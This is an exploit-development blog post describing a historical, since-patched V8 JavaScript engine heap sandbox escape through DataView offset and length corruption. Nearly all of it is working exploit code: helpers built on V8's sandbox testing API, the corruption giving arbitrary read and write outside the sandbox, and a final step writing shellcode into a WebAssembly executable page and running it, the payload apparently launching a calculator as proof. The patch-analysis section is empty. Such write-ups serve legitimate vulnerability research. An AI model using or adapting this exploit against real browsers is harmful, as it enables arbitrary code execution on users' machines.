<!doctype html><html lang=en>
<head><title>Exploring Historical V8 Heap Sandbox Escapes II &ndash; anvbis</title>
<meta name=description content="Exploit development and reverse engineering.">
<meta name=viewport content="width=device-width,initial-scale=1">
<meta charset=utf-8>
<link rel=stylesheet href=https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.1.2/css/all.min.css integrity="sha512-1sCRPdkRXhBV2PBLUdRb4tMg1w2YPf37qatUFeS7zlBy7jJI8Lf4VHwWfZZfpXtYSLy85pkm9GaYVYMfw5BC1A==" crossorigin=anonymous>
<link rel=stylesheet href=https://cdnjs.cloudflare.com/ajax/libs/academicons/1.9.1/css/academicons.min.css integrity="sha512-b1ASx0WHgVFL5ZQhTgiPWX+68KjS38Jk87jg7pe+qC7q9YkEtFq0z7xCglv7qGIs/68d3mAp+StfC8WKC5SSAg==" crossorigin=anonymous>
<link rel=stylesheet href=https://anvbis.github.io/css/palettes/horizon-dark.css>
<link rel=stylesheet href=https://anvbis.github.io/css/risotto.css>
<link rel=stylesheet href=https://anvbis.github.io/css/custom.css>
</head>
<body>
<div class=page>
<header class=page__header><h1 class=page__logo><a href=https://anvbis.github.io/ class=page__logo-inner>anvbis</a></h1>
<nav class="page__nav main-nav">
<ul>
<li class=main-nav__item><a class=nav-main-item href=https://anvbis.github.io/about title>About</a></li>
</ul>
</nav>
</header>
<section class=page__aside>
<div class=aside__about>
<div class=aside__about>
<h1 class=about__title>Anvbis</h1>
<p class=about__description>Exploit development and reverse engineering.</p>
</div>
<ul class=aside__social-links>
<li>
<a href=https://github.com/anvbis rel=me aria-label=GitHub title=GitHub><i class="fa-brands fa-github" aria-hidden=true></i></a>&nbsp;
</li>
<li>
<a href=https://infosec.exchange/@anvbis rel=me aria-label=Mastodon title=Mastodon><i class="fa-brands fa-mastodon" aria-hidden=true></i></a>&nbsp;
</li>
</ul>
</div>
<hr>
<div class=aside__content>
<p>
2023-01-20
</p>
</div>
</section>
<section class=page__body>
<header class=content__header>
<h1>Exploring Historical V8 Heap Sandbox Escapes II</h1>
</header>
<div class=content__body>
<h2 id=overview>Overview</h2>
<p>Corruption of the DataView object&rsquo;s <code>byte_length</code> and <code>byte_offset</code> fields results in arbitrary read and write primitives external to the heap sandbox.</p>
<p>You can find the patch for this heap sandbox escape here: <a href=https://chromium-review.googlesource.com/c/v8/v8/+/3876823>[sandbox] Introduce BoundedSize</a>.</p>
<h2 id=patch-analysis>Patch Analysis</h2>
<p>&mldr;</p>
<h2 id=exploit-primitives>Exploit Primitives</h2>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-js data-lang=js><span style=color:#66d9ef>const</span> <span style=color:#a6e22e>addrof</span> <span style=color:#f92672>=</span> <span style=color:#a6e22e>o</span> =&gt; {
  <span style=color:#66d9ef>return</span> <span style=color:#a6e22e>Sandbox</span>.<span style=color:#a6e22e>getAddressOf</span>(<span style=color:#a6e22e>o</span>);
};

<span style=color:#66d9ef>const</span> <span style=color:#a6e22e>weak_read</span> <span style=color:#f92672>=</span> <span style=color:#a6e22e>p</span> =&gt; {
  <span style=color:#66d9ef>let</span> <span style=color:#a6e22e>reader</span> <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> <span style=color:#a6e22e>Sandbox</span>.<span style=color:#a6e22e>MemoryView</span>(<span style=color:#a6e22e>p</span>, <span style=color:#ae81ff>64</span>);
  <span style=color:#66d9ef>let</span> <span style=color:#a6e22e>view</span> <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> <span style=color:#a6e22e>DataView</span>(<span style=color:#a6e22e>reader</span>);
  <span style=color:#66d9ef>return</span> <span style=color:#a6e22e>view</span>.<span style=color:#a6e22e>getBigUint64</span>(<span style=color:#ae81ff>0</span>, <span style=color:#66d9ef>true</span>); 
};

<span style=color:#66d9ef>const</span> <span style=color:#a6e22e>weak_write</span> <span style=color:#f92672>=</span> (<span style=color:#a6e22e>p</span>, <span style=color:#a6e22e>x</span>) =&gt; {
  <span style=color:#66d9ef>let</span> <span style=color:#a6e22e>writer</span> <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> <span style=color:#a6e22e>Sandbox</span>.<span style=color:#a6e22e>MemoryView</span>(<span style=color:#a6e22e>p</span>, <span style=color:#ae81ff>64</span>);
  <span style=color:#66d9ef>let</span> <span style=color:#a6e22e>view</span> <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> <span style=color:#a6e22e>DataView</span>(<span style=color:#a6e22e>writer</span>);
  <span style=color:#a6e22e>view</span>.<span style=color:#a6e22e>setBigUint64</span>(<span style=color:#ae81ff>0</span>, <span style=color:#a6e22e>x</span>, <span style=color:#66d9ef>true</span>);
};
</code></pre></div><h2 id=dataview-object-overview>DataView Object Overview</h2>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-js data-lang=js><span style=color:#66d9ef>let</span> <span style=color:#a6e22e>buf</span> <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> <span style=color:#a6e22e>ArrayBuffer</span>(<span style=color:#ae81ff>128</span>);
<span style=color:#66d9ef>let</span> <span style=color:#a6e22e>view</span> <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> <span style=color:#a6e22e>DataView</span>(<span style=color:#a6e22e>buf</span>);

<span style=color:#f92672>%</span><span style=color:#a6e22e>DebugPrint</span>(<span style=color:#a6e22e>view</span>);
</code></pre></div><h2 id=dataview-byte-offset-corruption>DataView Byte Offset Corruption</h2>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-js data-lang=js><span style=color:#66d9ef>let</span> <span style=color:#a6e22e>buf</span> <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> <span style=color:#a6e22e>ArrayBuffer</span>(<span style=color:#ae81ff>128</span>);
<span style=color:#66d9ef>let</span> <span style=color:#a6e22e>view</span> <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> <span style=color:#a6e22e>DataView</span>(<span style=color:#a6e22e>buf</span>);

<span style=color:#f92672>%</span><span style=color:#a6e22e>DebugPrint</span>(<span style=color:#a6e22e>view</span>);
<span style=color:#f92672>%</span><span style=color:#a6e22e>SystemBreak</span>();
<span style=color:#f92672>%</span><span style=color:#a6e22e>DebugPrint</span>(<span style=color:#a6e22e>view</span>);
</code></pre></div><h2 id=arbitrary-read-primitive>Arbitrary Read Primitive</h2>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-js data-lang=js><span style=color:#66d9ef>let</span> <span style=color:#a6e22e>heap</span> <span style=color:#f92672>=</span> (<span style=color:#a6e22e>weak_read</span>(<span style=color:#ae81ff>0x18</span>) <span style=color:#f92672>&gt;&gt;</span> <span style=color:#ae81ff>32</span><span style=color:#a6e22e>n</span>) <span style=color:#f92672>&lt;&lt;</span> <span style=color:#ae81ff>32</span><span style=color:#a6e22e>n</span>;
<span style=color:#66d9ef>let</span> <span style=color:#a6e22e>store</span> <span style=color:#f92672>=</span> <span style=color:#a6e22e>heap</span> <span style=color:#f92672>+</span> ((<span style=color:#a6e22e>weak_read</span>(<span style=color:#a6e22e>addrof</span>(<span style=color:#a6e22e>buf</span>) <span style=color:#f92672>+</span> <span style=color:#ae81ff>0x20</span>) <span style=color:#f92672>&amp;</span> <span style=color:#ae81ff>0xffffffff</span><span style=color:#a6e22e>n</span>) <span style=color:#f92672>&lt;&lt;</span> <span style=color:#ae81ff>8</span><span style=color:#a6e22e>n</span>);
<span style=color:#66d9ef>let</span> <span style=color:#a6e22e>offset</span> <span style=color:#f92672>=</span> <span style=color:#ae81ff>0xffffffffffffffff</span><span style=color:#a6e22e>n</span> <span style=color:#f92672>-</span> <span style=color:#a6e22e>store</span> <span style=color:#f92672>+</span> <span style=color:#ae81ff>1</span><span style=color:#a6e22e>n</span>;

<span style=color:#a6e22e>weak_write</span>(<span style=color:#a6e22e>addrof</span>(<span style=color:#a6e22e>view</span>) <span style=color:#f92672>+</span> <span style=color:#ae81ff>0x10</span>, <span style=color:#a6e22e>offset</span>);              <span style=color:#75715e>/* view.byte_offset */</span>
<span style=color:#a6e22e>weak_write</span>(<span style=color:#a6e22e>addrof</span>(<span style=color:#a6e22e>view</span>) <span style=color:#f92672>+</span> <span style=color:#ae81ff>0x18</span>, <span style=color:#ae81ff>0xffffffffffffffff</span><span style=color:#a6e22e>n</span>); <span style=color:#75715e>/* view.byte_length */</span>
</code></pre></div><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-js data-lang=js><span style=color:#66d9ef>const</span> <span style=color:#a6e22e>strong_read</span> <span style=color:#f92672>=</span> <span style=color:#a6e22e>p</span> =&gt; {
  <span style=color:#66d9ef>return</span> <span style=color:#a6e22e>view</span>.<span style=color:#a6e22e>getBigUint64</span>(Number(<span style=color:#a6e22e>p</span>), <span style=color:#66d9ef>true</span>);
};
</code></pre></div><h2 id=arbitrary-write-primitive>Arbitrary Write Primitive</h2>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-js data-lang=js><span style=color:#66d9ef>const</span> <span style=color:#a6e22e>strong_write</span> <span style=color:#f92672>=</span> (<span style=color:#a6e22e>p</span>, <span style=color:#a6e22e>x</span>) =&gt; {
  <span style=color:#66d9ef>return</span> <span style=color:#a6e22e>view</span>.<span style=color:#a6e22e>setBigUint64</span>(Number(<span style=color:#a6e22e>p</span>), <span style=color:#a6e22e>x</span>, <span style=color:#66d9ef>true</span>);
};
</code></pre></div><h2 id=code-execution>Code Execution</h2>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-js data-lang=js><span style=color:#66d9ef>let</span> <span style=color:#a6e22e>wasm</span> <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> <span style=color:#a6e22e>Uint8Array</span>([
  <span style=color:#ae81ff>0x00</span>, <span style=color:#ae81ff>0x61</span>, <span style=color:#ae81ff>0x73</span>, <span style=color:#ae81ff>0x6d</span>, <span style=color:#ae81ff>0x01</span>, <span style=color:#ae81ff>0x00</span>, <span style=color:#ae81ff>0x00</span>, <span style=color:#ae81ff>0x00</span>, <span style=color:#ae81ff>0x01</span>, <span style=color:#ae81ff>0x85</span>, <span style=color:#ae81ff>0x80</span>, <span style=color:#ae81ff>0x80</span>, <span style=color:#ae81ff>0x80</span>,
  <span style=color:#ae81ff>0x00</span>, <span style=color:#ae81ff>0x01</span>, <span style=color:#ae81ff>0x60</span>, <span style=color:#ae81ff>0x00</span>, <span style=color:#ae81ff>0x01</span>, <span style=color:#ae81ff>0x7f</span>, <span style=color:#ae81ff>0x03</span>, <span style=color:#ae81ff>0x82</span>, <span style=color:#ae81ff>0x80</span>, <span style=color:#ae81ff>0x80</span>, <span style=color:#ae81ff>0x80</span>, <span style=color:#ae81ff>0x00</span>, <span style=color:#ae81ff>0x01</span>,
  <span style=color:#ae81ff>0x00</span>, <span style=color:#ae81ff>0x04</span>, <span style=color:#ae81ff>0x84</span>, <span style=color:#ae81ff>0x80</span>, <span style=color:#ae81ff>0x80</span>, <span style=color:#ae81ff>0x80</span>, <span style=color:#ae81ff>0x00</span>, <span style=color:#ae81ff>0x01</span>, <span style=color:#ae81ff>0x70</span>, <span style=color:#ae81ff>0x00</span>, <span style=color:#ae81ff>0x00</span>, <span style=color:#ae81ff>0x05</span>, <span style=color:#ae81ff>0x83</span>,
  <span style=color:#ae81ff>0x80</span>, <span style=color:#ae81ff>0x80</span>, <span style=color:#ae81ff>0x80</span>, <span style=color:#ae81ff>0x00</span>, <span style=color:#ae81ff>0x01</span>, <span style=color:#ae81ff>0x00</span>, <span style=color:#ae81ff>0x01</span>, <span style=color:#ae81ff>0x06</span>, <span style=color:#ae81ff>0x81</span>, <span style=color:#ae81ff>0x80</span>, <span style=color:#ae81ff>0x80</span>, <span style=color:#ae81ff>0x80</span>, <span style=color:#ae81ff>0x00</span>,
  <span style=color:#ae81ff>0x00</span>, <span style=color:#ae81ff>0x07</span>, <span style=color:#ae81ff>0x91</span>, <span style=color:#ae81ff>0x80</span>, <span style=color:#ae81ff>0x80</span>, <span style=color:#ae81ff>0x80</span>, <span style=color:#ae81ff>0x00</span>, <span style=color:#ae81ff>0x02</span>, <span style=color:#ae81ff>0x06</span>, <span style=color:#ae81ff>0x6d</span>, <span style=color:#ae81ff>0x65</span>, <span style=color:#ae81ff>0x6d</span>, <span style=color:#ae81ff>0x6f</span>,
  <span style=color:#ae81ff>0x72</span>, <span style=color:#ae81ff>0x79</span>, <span style=color:#ae81ff>0x02</span>, <span style=color:#ae81ff>0x00</span>, <span style=color:#ae81ff>0x04</span>, <span style=color:#ae81ff>0x6d</span>, <span style=color:#ae81ff>0x61</span>, <span style=color:#ae81ff>0x69</span>, <span style=color:#ae81ff>0x6e</span>, <span style=color:#ae81ff>0x00</span>, <span style=color:#ae81ff>0x00</span>, <span style=color:#ae81ff>0x0a</span>, <span style=color:#ae81ff>0x8a</span>,
  <span style=color:#ae81ff>0x80</span>, <span style=color:#ae81ff>0x80</span>, <span style=color:#ae81ff>0x80</span>, <span style=color:#ae81ff>0x00</span>, <span style=color:#ae81ff>0x01</span>, <span style=color:#ae81ff>0x84</span>, <span style=color:#ae81ff>0x80</span>, <span style=color:#ae81ff>0x80</span>, <span style=color:#ae81ff>0x80</span>, <span style=color:#ae81ff>0x00</span>, <span style=color:#ae81ff>0x00</span>, <span style=color:#ae81ff>0x41</span>, <span style=color:#ae81ff>0x2a</span>,
  <span style=color:#ae81ff>0x0b</span>
]);
<span style=color:#66d9ef>let</span> <span style=color:#a6e22e>module</span> <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> <span style=color:#a6e22e>WebAssembly</span>.<span style=color:#a6e22e>Module</span>(<span style=color:#a6e22e>wasm</span>);

<span style=color:#66d9ef>let</span> <span style=color:#a6e22e>instance</span> <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> <span style=color:#a6e22e>WebAssembly</span>.<span style=color:#a6e22e>Instance</span>(<span style=color:#a6e22e>module</span>);
<span style=color:#66d9ef>let</span> <span style=color:#a6e22e>rwx</span> <span style=color:#f92672>=</span> <span style=color:#a6e22e>weak_read</span>(<span style=color:#a6e22e>addrof</span>(<span style=color:#a6e22e>instance</span>) <span style=color:#f92672>+</span> <span style=color:#ae81ff>0x60</span>);

<span style=color:#66d9ef>let</span> <span style=color:#a6e22e>shellcode</span> <span style=color:#f92672>=</span> [
  <span style=color:#ae81ff>0x732f6e69622fb848</span><span style=color:#a6e22e>n</span>,
  <span style=color:#ae81ff>0x66525f5450990068</span><span style=color:#a6e22e>n</span>,
  <span style=color:#ae81ff>0x15e8525e54632d68</span><span style=color:#a6e22e>n</span>,
  <span style=color:#ae81ff>0x4c50534944000000</span><span style=color:#a6e22e>n</span>,
  <span style=color:#ae81ff>0x302e303a273d5941</span><span style=color:#a6e22e>n</span>,
  <span style=color:#ae81ff>0x00636c6163782027</span><span style=color:#a6e22e>n</span>,
  <span style=color:#ae81ff>0x0f583b6a5e545756</span><span style=color:#a6e22e>n</span>,
  <span style=color:#ae81ff>0x0000000000000005</span><span style=color:#a6e22e>n</span>
];

<span style=color:#66d9ef>for</span> (<span style=color:#66d9ef>let</span> <span style=color:#a6e22e>i</span> <span style=color:#f92672>=</span> <span style=color:#ae81ff>0</span>; <span style=color:#a6e22e>i</span> <span style=color:#f92672>&lt;</span> <span style=color:#a6e22e>shellcode</span>.<span style=color:#a6e22e>length</span>; <span style=color:#a6e22e>i</span><span style=color:#f92672>++</span>)
  <span style=color:#a6e22e>strong_write</span>(<span style=color:#a6e22e>rwx</span> <span style=color:#f92672>+</span> (<span style=color:#ae81ff>8</span><span style=color:#a6e22e>n</span> <span style=color:#f92672>*</span> <span style=color:#a6e22e>BigInt</span>(<span style=color:#a6e22e>i</span>)), <span style=color:#a6e22e>shellcode</span>[<span style=color:#a6e22e>i</span>]);

<span style=color:#a6e22e>instance</span>.<span style=color:#a6e22e>exports</span>.<span style=color:#a6e22e>main</span>();
</code></pre></div><h2 id=references>References</h2>
<ul>
<li><a href=https://chromium-review.googlesource.com/c/v8/v8/+/3876823>[sandbox] Introduce BoundedSize</a></li>
</ul>
</div>
<footer class=content__footer></footer>
</section>
<footer class=page__footer><p>
</p>
<br><br>
<p class=advertisement>Anvis &copy; 2023</p>
</footer>
</div>
</body>
</html>